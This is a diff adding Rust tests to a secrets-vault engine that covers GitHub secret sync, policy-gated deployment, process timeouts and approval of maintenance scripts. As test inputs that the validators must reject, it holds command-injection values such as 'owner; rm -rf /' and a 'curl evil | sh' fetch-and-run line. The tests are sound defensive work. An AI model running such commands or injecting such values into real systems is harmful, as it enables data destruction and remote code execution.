+    fn failure_output_detail_tails_long_output() {
+        let long = "x".repeat(FAILURE_OUTPUT_CHARS + 100);
+        let detail = failure_output_detail(&long, "");
+        assert!(!detail.contains(&"x".repeat(FAILURE_OUTPUT_CHARS + 1)));
+        assert!(detail.len() < "stdout: ".len() + FAILURE_OUTPUT_CHARS + 16);
+    }
+
+    #[test]
+    fn github_sync_rejects_malformed_names() {
+        for repo in [
+            "",
+            "no-slash",
+            "/noname",
+            "owner/",
+            "owner/repo/extra",
+            "owner; rm -rf /",
+            "owner/repo --repo evil",
+            "https://github.com/owner/repo",
+        ] {
+            assert!(
+                VaultEngine::validate_github_repo(repo).is_err(),
+                "repo accepted: {repo}"
+            );
+        }
+        for name in [
+            "",
+            "lowercase",
+            "WITH-DASH",
+            "WITH SPACE",
+            "NAME;",
+            "A".repeat(65).as_str(),
+        ] {
+            assert!(
+                VaultEngine::validate_github_secret_name(name).is_err(),
+                "secret accepted: {name}"
+            );
+        }
+        assert!(VaultEngine::validate_github_repo("GATE-And-Tech/gate-2027-website").is_ok());
+        assert!(VaultEngine::validate_github_secret_name("CLOUDFLARE_API_TOKEN").is_ok());
+        for env in ["", "has space", "semi;colon", "a".repeat(101).as_str()] {
+            assert!(
+                VaultEngine::validate_github_env(env).is_err(),
+                "env accepted: {env}"
+            );
+        }
+        assert!(VaultEngine::validate_github_env("production").is_ok());
+    }
+
+    #[tokio::test]
+    async fn github_sync_copies_value_without_exposing_it() {
+        use std::os::unix::fs::PermissionsExt;
+        let (mut engine, dir) = setup();
+        let fake_value = "gh-sync-fake-cloudflare-token-abcdef123456";
+        engine
+            .add_secret("cf-test", "CLOUDFLARE_API_TOKEN", fake_value, None)
+            .unwrap();
+        // Hermetic `gh`: resolves via a prepended PATH entry (original PATH
+        // kept, so parallel tests spawning node/npx/sh are unaffected).
+        let bindir = dir.join("bin");
+        std_fs::create_dir_all(&bindir).unwrap();
+        let marker = dir.join("synced-body");
+        let argmarker = dir.join("synced-args");
+        let argvmarker = dir.join("synced-argv");
+        std_fs::write(
+            bindir.join("gh"),
+            format!(
+                "#!/bin/sh\nprintf '%s' \"$VAULTLY_SYNC_BODY\" > '{}'\nprintf '%s|%s' \"$VAULTLY_SYNC_SECRET\" \"$VAULTLY_SYNC_REPO\" > '{}'\nprintf '%s' \"$*\" > '{}'\n",
+                marker.display(),
+                argmarker.display(),
+                argvmarker.display()
+            ),
+        )
+        .unwrap();
+        std_fs::set_permissions(bindir.join("gh"), std_fs::Permissions::from_mode(0o755)).unwrap();
+        let old_path = std::env::var_os("PATH").unwrap_or_default();
+        let mut paths = vec![bindir.into_os_string()];
+        paths.extend(std::env::split_paths(&old_path).map(|p| p.into_os_string()));
+        std::env::set_var("PATH", std::env::join_paths(paths).unwrap());
+        let status = engine
+            .sync_github_secret(
+                "cf-test",
+                "CLOUDFLARE_API_TOKEN",
+                "owner/repo",
+                "CLOUDFLARE_API_TOKEN",
+                None,
+                Some(&agent_ctx()),
+            )
+            .await;
+        let status = status.unwrap();
+        // Status carries names only.
+        assert!(status.contains("owner/repo"));
+        assert!(!status.contains(fake_value));
+        // Environment-scoped sync passes --env through to gh.
+        engine
+            .sync_github_secret(
+                "cf-test",
+                "CLOUDFLARE_API_TOKEN",
+                "owner/repo",
+                "CLOUDFLARE_API_TOKEN",
+                Some("production"),
+                Some(&agent_ctx()),
+            )
+            .await
+            .unwrap();
+        std::env::set_var("PATH", old_path);
+        // The value reached `gh` stdin-equivalent (env body) byte-for-byte.
+        assert_eq!(std_fs::read_to_string(&marker).unwrap(), fake_value);
+        assert_eq!(
+            std_fs::read_to_string(&argmarker).unwrap(),
+            "CLOUDFLARE_API_TOKEN|owner/repo"
+        );
+        let audit = std_fs::read_to_string(engine.store.audit_log_path()).unwrap();
+        assert!(audit.contains("GITHUB_SYNC"));
+        assert!(!audit.contains(fake_value));
+        let argv = std_fs::read_to_string(&argvmarker).unwrap();
+        assert!(argv.contains("--env production"), "argv was: {argv}");
+    }
+
+    #[tokio::test]
+    async fn github_sync_missing_key_reports_names_only() {
+        let (mut engine, _dir) = setup();
+        engine
+            .add_secret("cf-test", "OTHER_KEY", "v", None)
+            .unwrap();
+        let err = engine
+            .sync_github_secret(
+                "cf-test",
+                "NOPE",
+                "owner/repo",
+                "CLOUDFLARE_API_TOKEN",
+                None,
+                Some(&agent_ctx()),
+            )
+            .await
+            .unwrap_err()
+            .to_string();
+        assert!(err.contains("NOPE"));
+        assert!(err.contains("cf-test"));
+    }
+
     #[tokio::test]
     async fn engine_meta_reports_expiry_and_timestamps() {
         let (mut engine, _dir) = setup();
@@ -2207,6 +3110,259 @@ mod tests {
         assert!(engine.list_keys("any", Some(&agent_ctx())).is_err());
         engine.unlock(PASSWORD).unwrap();
         assert!(engine.is_unlocked());
+    }
+
+    #[tokio::test]
+    async fn validated_deploy_runner_does_not_require_generic_run_permission() {
+        let (mut engine, dir) = setup();
+        engine
+            .add_secret(
+                "cf-deploy",
+                "CLOUDFLARE_API_TOKEN",
+                "deployment-secret",
+                Some(&agent_ctx()),
+            )
+            .unwrap();
+        engine.set_agent_policies(vec![crate::policy::AgentPolicy {
+            name: "test-agent".into(),
+            allowed_vaults: crate::policy::AllowedVaults::List(vec!["cf-deploy".into()]),
+            allowed_operations: crate::policy::AllowedOperations::List(vec![
+                crate::policy::Operation::Deploy,
+            ]),
+            roles: Default::default(),
+            vault_roles: Default::default(),
+            max_ops_per_minute: 60,
+            created_at: "2020-01-01T00:00:00Z".into(),
+        }]);
+
+        let args = vec![
+            "-c".to_string(),
+            "printf '%s' \"$CLOUDFLARE_API_TOKEN\"".to_string(),
+        ];
+        let opts = RunOptions {
+            cwd: Some(dir.to_str().unwrap()),
+            timeout_ms: Some(30_000),
+            allowed_keys: Some(&["CLOUDFLARE_API_TOKEN".to_string()]),
+        };
+
+        let generic = engine
+            .run("cf-deploy", "sh", &args, &opts, Some(&agent_ctx()))
+            .await
+            .unwrap_err();
+        assert!(generic.to_string().contains("cannot perform 'run'"));
+
+        let deployment = engine
+            .run_with_secrets(
+                "cf-deploy",
+                "sh",
+                &args,
+                &opts,
+                Some(&agent_ctx()),
+                "DEPLOY_RUN",
+            )
+            .await
+            .unwrap();
+        assert_eq!(deployment.code, 0);
+        assert_eq!(deployment.secrets_injected, vec!["CLOUDFLARE_API_TOKEN"]);
+        assert!(deployment.scrubbed);
+        assert_eq!(deployment.stdout, "[REDACTED]");
+    }
+
+    #[cfg(unix)]
+    #[tokio::test]
+    async fn validated_deploy_spawn_handles_signals_and_descendant_pipes() {
+        let mut engine = VaultEngine::with_dir(None, temp_dir());
+        let signaled = engine
+            .spawn(
+                "sh",
+                &["-c".into(), "kill -TERM $$".into()],
+                &[],
+                None,
+                1000,
+            )
+            .await
+            .unwrap();
+        assert_ne!(signaled.code, 0);
+        let started = Instant::now();
+        let timed_out = engine
+            .spawn(
+                "sh",
+                &["-c".into(), "sleep 30 & wait".into()],
+                &[],
+                None,
+                100,
+            )
+            .await
+            .unwrap();
+        assert_eq!(timed_out.code, 124);
+        assert!(started.elapsed() < Duration::from_secs(5));
+        let exited = engine
+            .spawn(
+                "sh",
+                &["-c".into(), "sleep 30 & exit 0".into()],
+                &[],
+                None,
+                1000,
+            )
+            .await
+            .unwrap();
+        assert_eq!(exited.code, 0);
+        assert!(started.elapsed() < Duration::from_secs(5));
+    }
+
+    #[tokio::test]
+    async fn validated_deploy_target_enforces_boundary_end_to_end() {
+        let (mut engine, _vault_dir) = setup();
+        let dir = std::env::current_dir()
+            .unwrap()
+            .join("target")
+            .join(format!(
+                "deploy-fixture-{}-{}",
+                std::process::id(),
+                TEST_COUNTER.fetch_add(1, Ordering::SeqCst)
+            ));
+        std_fs::create_dir_all(&dir).unwrap();
+        let dir = std_fs::canonicalize(dir).unwrap();
+        let config = r#"{"name":"test-worker","main":"index.js"}"#;
+        std_fs::write(dir.join("wrangler.jsonc"), config).unwrap();
+        std_fs::write(dir.join("package.json"), r#"{"scripts":{"build":"node build.cjs","predeploy":"node guard.cjs","deploy":"node deploy.cjs"}}"#).unwrap();
+        std_fs::write(dir.join("build.cjs"), r#"
+            const fs = require('fs');
+            if (process.env.CLOUDFLARE_API_TOKEN || process.env.PRIVATE_KEY || process.env.VAULTLY_MASTER_PASSWORD) process.exit(19);
+            fs.writeFileSync('built', 'ok');
+            if (fs.existsSync('tamper')) fs.writeFileSync('wrangler.jsonc', '{"name":"wrong-worker","main":"index.js"}');
+        "#).unwrap();
+        std_fs::write(
+            dir.join("guard.cjs"),
+            r#"
+            const fs = require('fs');
+            if (fs.existsSync('refuse')) { console.log('guard-refused-because-refuse-file-present'); process.exit(23); }
+            fs.writeFileSync('guarded', 'ok');
+        "#,
+        )
+        .unwrap();
+        std_fs::write(dir.join("deploy.cjs"), r#"
+            const fs = require('fs');
+            if (!fs.existsSync('built') || !fs.existsSync('guarded')) process.exit(25);
+            if (process.env.CLOUDFLARE_API_TOKEN !== 'fake-deploy-credential' || process.env.PRIVATE_KEY || process.env.VAULTLY_MASTER_PASSWORD) process.exit(26);
+            console.log(process.env.CLOUDFLARE_API_TOKEN);
+            console.error(process.env.CLOUDFLARE_API_TOKEN);
+            fs.writeFileSync('published', 'ok');
+        "#).unwrap();
+        for (name, value) in [
+            ("CLOUDFLARE_API_TOKEN", "fake-deploy-credential"),
+            ("CLOUDFLARE_ACCOUNT_ID", "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"),
+            ("PRIVATE_KEY", "fake-unrelated-credential"),
+        ] {
+            engine.add_secret("cf-test", name, value, None).unwrap();
+        }
+        let target = DeploymentTarget {
+            id: "fixture-worker".into(),
+            provider: DeploymentProvider::Worker,
+            vault: "cf-test".into(),
+            account_id: "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa".into(),
+            project: "test-worker".into(),
+            project_dir: dir.to_string_lossy().into(),
+            build_command: "npm run build".into(),
+            output_dir: ".".into(),
+            branch: None,
+            worker_package_deploy: true,
+            created_at: "2026-01-01T00:00:00Z".into(),
+        };
+        engine
+            .store
+            .save_deployment_targets(&[target.clone()])
+            .unwrap();
+        let ctx = agent_ctx();
+        let result = engine.deploy_target(&target, Some(&ctx)).await.unwrap();
+        assert_eq!(result.status, "success");
+        assert!(dir.join("published").exists());
+        let audit = std_fs::read_to_string(engine.store.audit_log_path()).unwrap();
+        assert!(audit.contains("DEPLOY_RUN"));
+        assert!(!audit.contains("fake-deploy-credential"));
+        assert!(!audit.contains("fake-unrelated-credential"));
+        assert!(engine
+            .run("cf-test", "node", &[], &RunOptions::default(), Some(&ctx))
+            .await
+            .is_err());
+
+        std_fs::remove_file(dir.join("published")).unwrap();
+        std_fs::write(dir.join("refuse"), "1").unwrap();
+        let refusal = engine
+            .deploy_target(&target, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string();
+        assert!(refusal.contains("Worker deployment for target"));
+        // The guard's stdout refusal reason must reach the agent (no human
+        // re-run needed), while injected credential values must never leak.
+        assert!(refusal.contains("guard-refused-because-refuse-file-present"));
+        assert!(!refusal.contains("fake-deploy-credential"));
+        assert!(!refusal.contains("fake-unrelated-credential"));
+        assert!(!dir.join("published").exists());
+        std_fs::remove_file(dir.join("refuse")).unwrap();
+
+        std_fs::write(dir.join("tamper"), "1").unwrap();
+        assert!(engine
+            .deploy_target(&target, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string()
+            .contains("no longer matches"));
+        assert!(!dir.join("published").exists());
+        std_fs::remove_file(dir.join("tamper")).unwrap();
+        std_fs::write(dir.join("wrangler.jsonc"), config).unwrap();
+
+        let mut changed = target.clone();
+        changed.project = "wrong-worker".into();
+        assert!(engine
+            .deploy_target(&changed, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string()
+            .contains("not registered"));
+        engine
+            .add_secret(
+                "cf-test",
+                "CLOUDFLARE_ACCOUNT_ID",
+                "bbbbbbbbbbbbbbbbbbbbbbbbbbbbbbbb",
+                None,
+            )
+            .unwrap();
+        assert!(engine
+            .deploy_target(&target, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string()
+            .contains("different Cloudflare account"));
+        engine
+            .add_secret("cf-test", "CLOUDFLARE_ACCOUNT_ID", &target.account_id, None)
+            .unwrap();
+        engine
+            .add_secret_with_expiry(
+                "cf-test",
+                "CLOUDFLARE_API_TOKEN",
+                "fake-deploy-credential",
+                Some("2020-01-01T00:00:00Z"),
+                None,
+            )
+            .unwrap();
+        assert!(engine
+            .deploy_target(&target, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string()
+            .contains("expired"));
+        assert!(!dir.join("published").exists());
+
+        engine.kill(Some(&ctx));
+        assert!(engine
+            .deploy_target(&target, Some(&ctx))
+            .await
+            .unwrap_err()
+            .to_string()
+            .contains("Killswitch"));
+        std_fs::remove_dir_all(&dir).unwrap();
     }
 
     #[tokio::test]
@@ -3126,5 +4282,129 @@ mod tests {
         assert!(reqs2.lock().unwrap()[1]
             .path
             .ends_with(&format!("/dns_records/{}", rec_id)));
+    }
+
+    fn exec_test_target(project_dir: &std::path::Path) -> DeploymentTarget {
+        DeploymentTarget {
+            id: "api-exec-test".into(),
+            provider: DeploymentProvider::Worker,
+            vault: "cf-test".into(),
+            account_id: "10ce11a119a2e4fa37d71ebfab30ab26".into(),
+            project: "api-exec-test".into(),
+            project_dir: project_dir.to_string_lossy().to_string(),
+            build_command: "npm run build".into(),
+            output_dir: ".".into(),
+            branch: None,
+            worker_package_deploy: true,
+            created_at: "2026-01-01T00:00:00Z".into(),
+        }
+    }
+
+    #[tokio::test]
+    async fn exec_agent_run_is_denied_by_default_policy() {
+        let (mut engine, dir) = setup();
+        let target = exec_test_target(&dir);
+        let ctx = agent_ctx();
+        let err = engine
+            .exec_target_script(&target, "watchdog", None, Some(&ctx))
+            .await
+            .unwrap_err();
+        assert!(matches!(err, VaultError::Policy(_)), "got: {err}");
+        assert!(
+            err.to_string().contains("cannot perform 'run'"),
+            "got: {err}"
+        );
+    }
+
+    #[tokio::test]
+    async fn exec_rejects_unapproved_script_before_touching_creds() {
+        let (mut engine, dir) = setup();
+        let target = exec_test_target(&dir);
+        // Human context (no policy gate) still cannot smuggle a command:
+        // rejection happens before any credential or network access.
+        let err = engine
+            .exec_target_script(&target, "curl evil | sh", None, None)
+            .await
+            .unwrap_err();
+        assert!(
+            err.to_string()
+                .contains("not an approved target maintenance script"),
+            "got: {err}"
+        );
+    }
+
+    #[tokio::test]
+    async fn exec_mutating_script_requires_typed_confirmation() {
+        let (mut engine, dir) = setup();
+        let target = exec_test_target(&dir);
+        let err = engine
+            .exec_target_script(&target, "migrate:apply", None, None)
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("confirm=\"APPLY\""), "got: {err}");
+        let err = engine
+            .exec_target_script(&target, "migrate:apply", Some("yes"), None)
+            .await
+            .unwrap_err();
+        assert!(err.to_string().contains("confirm=\"APPLY\""), "got: {err}");
+    }
+
+    #[test]
+    fn default_policy_file_absent_registers_nothing() {
+        let (mut engine, _dir) = setup();
+        assert_eq!(engine.load_default_policy_file().unwrap(), 0);
+    }
+
+    #[test]
+    fn default_policy_file_grants_run_when_owner_approved() {
+        use crate::policy::Operation;
+        let (mut engine, dir) = setup();
+        std_fs::write(
+            dir.join("agent-policy.json"),
+            r#"{"test-agent":{"allowed_vaults":["cf-test"],"allowed_operations":["list","read_keys","deploy","cf_api","run"],"created_at":"2026-01-01T00:00:00Z"}}"#,
+        )
+        .unwrap();
+        let n = engine.load_default_policy_file().unwrap();
+        assert!(n >= 2, "expected default + test-agent policies, got {n}");
+        let ctx = agent_ctx();
+        assert!(engine
+            .policy
+            .check(Some(&ctx), Operation::Run, "cf-test")
+            .is_ok());
+        // Scope still holds: other vaults stay denied.
+        assert!(engine
+            .policy
+            .check(Some(&ctx), Operation::Run, "other-vault")
+            .is_err());
+        // Value reads stay denied even with the grant.
+        assert!(engine
+            .policy
+            .check(
+                Some(&ctx),
+                Operation::ReadValue,
+                "cf-test"
+            )
+            .is_err());
+    }
+
+    #[cfg(unix)]
+    #[test]
+    fn default_policy_file_refuses_group_writable_grants() {
+        use std::os::unix::fs::PermissionsExt;
+        let (mut engine, dir) = setup();
+        let path = dir.join("agent-policy.json");
+        std_fs::write(
+            &path,
+            r#"{"test-agent":{"allowed_operations":["run"],"created_at":"2026-01-01T00:00:00Z"}}"#,
+        )
+        .unwrap();
+        let mut perms = std_fs::metadata(&path).unwrap().permissions();
+        perms.set_mode(0o664);
+        std_fs::set_permissions(&path, perms).unwrap();
+        let err = engine.load_default_policy_file().unwrap_err();
+        assert!(
+            err.to_string().contains("group/other-writable"),
+            "got: {err}"
+        );
     }
 }
